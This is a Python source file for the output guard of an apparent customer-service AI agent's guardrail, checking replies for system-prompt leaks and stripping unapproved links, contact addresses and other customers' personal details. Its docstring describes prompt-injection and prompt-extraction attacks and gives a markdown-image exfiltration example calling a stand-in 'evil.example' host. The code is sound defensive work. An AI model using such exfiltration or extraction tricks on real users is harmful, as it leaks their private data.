"""Output guard: the last check before a reply reaches the customer (check_output).

The input and action guards cover what comes in and what the agent does. Some attacks need
neither: the reply itself can carry the harm. Three deterministic checks, so each verdict has a
plain reason:

  system-prompt leak   BLOCK  The reply contains the session's canary token, or reproduces at
                              least LEAK_COVERAGE of the system prompt's word 8-grams. A
                              coverage share, not a single match, because quoting one business
                              rule ("refunds cannot exceed the amount paid") to a customer is
                              normal; dumping a fifth of the prompt is not.
  link / contact       SANITIZE  URLs whose host is not on the domain's allowlist are removed,
  allowlist                   including a bare host name with no scheme ("novamart-track.example",
                              which a person will still type or a chat UI will still link). A
                              markdown image such as ![](https://evil.example/?d=<phone>) is
                              fetched automatically by many chat UIs, which sends the data out
                              without anyone clicking. Email addresses that are neither the
                              principal's own nor on an allowed domain are removed too, so an
                              injected "contact verify@..." cannot reach the principal.
  other people's       SANITIZE  Details that belong to another principal are masked. Which
  details                     values those are is the application's knowledge, so the domain's
                              resolver supplies them (protected_values); the logged-in
                              principal's own details are left alone, and so is anything the
                              principal typed in this session: repeating what a person told the
                              agent discloses nothing to them (a customer moving to a relative's
                              address, who is also a customer).

The bare-host pattern is a heuristic. It recognises a fixed list of common top-level domains
and country-code forms such as "com.my"; two-letter codes that are also English words ("it",
"in", "my" on its own) are left out, because a missing space after a full stop ("arrived.it")
would otherwise be read as a link.
"""

import re
import secrets
from dataclasses import dataclass, field
from urllib.parse import urlsplit

from guardrail.domain import ResourceResolver
from guardrail.specs import Verdict
from guardrail.trust import DIGIT_RUN, appears_in, digits, normalise

LEAK_NGRAM = 8
LEAK_COVERAGE = 0.2
LINK_REMOVED, CONTACT_REMOVED, PII_REMOVED = "[link removed]", "[address removed]", "[redacted]"
_URL = re.compile(r"(?:https?://|www\.)[^\s<>()\[\]\"']+", re.IGNORECASE)
_TLDS = ("com|net|org|info|biz|io|co|ai|app|dev|xyz|online|site|shop|store|top|club|live|link|click|example|test|"
         "invalid|uk|sg|cn|ru|de|fr|nl|eu|au|jp|kr|hk|tw|th|vn|ph|br|ca|es|ch|se|pl|tv|cc|ly")
_BARE_HOST = re.compile(rf"(?<![\w@./-])(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+"
                        rf"(?:(?:com|net|org|edu|gov|co)\.[a-z]{{2}}|{_TLDS})(?![\w-])(?:/[^\s<>()\[\]\"']*)?",
                        re.IGNORECASE)
_EMAIL = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")


def ngrams(text: str, n: int = LEAK_NGRAM) -> set[str]:
    words = re.findall(r"[a-z0-9']+", text.lower())
    return {" ".join(words[i:i + n]) for i in range(len(words) - n + 1)}


def allowed_host(host: str, allowed: list[str]) -> bool:
    host = host.lower().rstrip(".")
    return any(host == d or host.endswith("." + d) for d in allowed)


@dataclass
class OutputResult:
    verdict: Verdict
    text: str
    reasons: list[str] = field(default_factory=list)


class OutputGuard:
    def __init__(self, resolver: ResourceResolver, allowed_domains: list[str], principal_label: str = "user"):
        self.resolver, self.allowed = resolver, [d.lower() for d in allowed_domains]
        self.principal_label = principal_label

    @staticmethod
    def new_canary() -> str:
        return f"NM-{secrets.token_hex(6)}"

    def leak(self, reply: str, canary: str | None, system_texts: list[str]) -> str | None:
        if canary and canary.lower() in reply.lower():
            return "canary token in reply"
        reply_grams = ngrams(reply)
        for system in system_texts:
            grams = ngrams(system)
            if grams and len(grams & reply_grams) / len(grams) >= LEAK_COVERAGE:
                return f"reply reproduces {len(grams & reply_grams) / len(grams):.0%} of the system prompt"
        return None

    def check(self, reply: str, principal_id: str, canary: str | None, system_texts: list[str],
              typed: list[str] | None = None) -> OutputResult:
        """`typed`: the principal's own messages in this session, normalised (the ledger's user_texts)."""
        typed = typed or []
        if reason := self.leak(reply, canary, system_texts):
            return OutputResult(Verdict.BLOCK, reply, [f"prompt_leak: {reason}"])
        text, reasons = reply, []

        def drop_url(match: re.Match) -> str:
            url = match.group(0)
            host = urlsplit(url if "://" in url else "http://" + url).hostname or ""
            if allowed_host(host, self.allowed):
                return url
            reasons.append(f"link: {host}")
            return LINK_REMOVED
        text = _URL.sub(drop_url, text)

        def drop_bare_host(match: re.Match) -> str:
            host = match.group(0).split("/", 1)[0]
            if allowed_host(host, self.allowed):
                return match.group(0)
            reasons.append(f"link: {host.lower()}")
            return LINK_REMOVED
        text = _BARE_HOST.sub(drop_bare_host, text)

        own = {normalise(v) for v in (self.resolver.principal(principal_id) or {}).values()
               if isinstance(v, str) and _EMAIL.fullmatch(v)}
        protected = [p for p in self.resolver.protected_values(principal_id)
                     if not appears_in(normalise(p.value), typed)]
        other = f"pii: another {self.principal_label}'s"
        other_emails = {normalise(p.value): p.label for p in protected if p.kind == "email"}

        def drop_email(match: re.Match) -> str:
            address = match.group(0)
            if normalise(address) in own or allowed_host(address.rsplit("@", 1)[1], self.allowed):
                return address
            if normalise(address) in other_emails:
                reasons.append(f"{other} {other_emails[normalise(address)]}")
                return PII_REMOVED
            reasons.append(f"contact: {address.rsplit('@', 1)[1]}")
            return CONTACT_REMOVED
        text = _EMAIL.sub(drop_email, text)

        other_phones = {digits(p.value): p.label for p in protected if p.kind == "phone"}

        def drop_phone(match: re.Match) -> str:
            if digits(match.group(0)) in other_phones:
                reasons.append(f"{other} {other_phones[digits(match.group(0))]}")
                return PII_REMOVED
            return match.group(0)
        text = DIGIT_RUN.sub(drop_phone, text)

        for value in (p for p in protected if p.kind == "text"):
            pattern = re.compile(re.escape(value.value).replace(r"\ ", r"\s+"), re.IGNORECASE)
            if pattern.search(text):
                reasons.append(f"{other} {value.label}")
                text = pattern.sub(PII_REMOVED, text)

        return OutputResult(Verdict.SANITIZE if reasons else Verdict.ALLOW, text, reasons)
